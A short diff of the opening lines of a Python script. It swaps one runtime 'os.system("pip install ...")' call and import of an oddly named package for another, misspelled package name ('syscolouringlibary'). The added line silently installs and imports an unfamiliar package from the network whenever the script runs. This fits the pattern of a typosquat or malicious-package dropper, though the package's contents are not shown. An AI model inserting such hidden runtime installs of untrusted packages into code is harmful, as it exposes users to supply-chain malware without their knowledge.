@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycoloringsaddition")
-import pycoloringsaddition
+os.system("pip install syscolouringlibary")
+import syscolouringlibary
 import random
 import requests
 import time
